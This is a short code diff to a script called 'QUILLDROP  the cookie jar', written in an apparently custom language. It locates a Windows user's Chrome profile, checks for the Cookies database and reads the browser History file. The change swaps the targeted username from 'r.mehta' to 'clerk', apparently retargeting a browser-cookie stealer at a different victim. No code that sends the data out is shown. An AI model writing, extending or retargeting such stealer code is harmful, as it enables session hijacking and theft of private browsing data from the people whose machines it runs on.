@@ -2,7 +2,7 @@ import "lib/quilldrop.mut";
 
 putln("QUILLDROP  the cookie jar");
 
-let chrome = quilldrop.path("Users/r.mehta/AppData/Local/Google/Chrome");
+let chrome = quilldrop.path("Users/clerk/AppData/Local/Google/Chrome");
 
 if (quilldrop.ready(chrome + "/Cookies")) {
     let history, _ = browser_history(chrome + "/History");
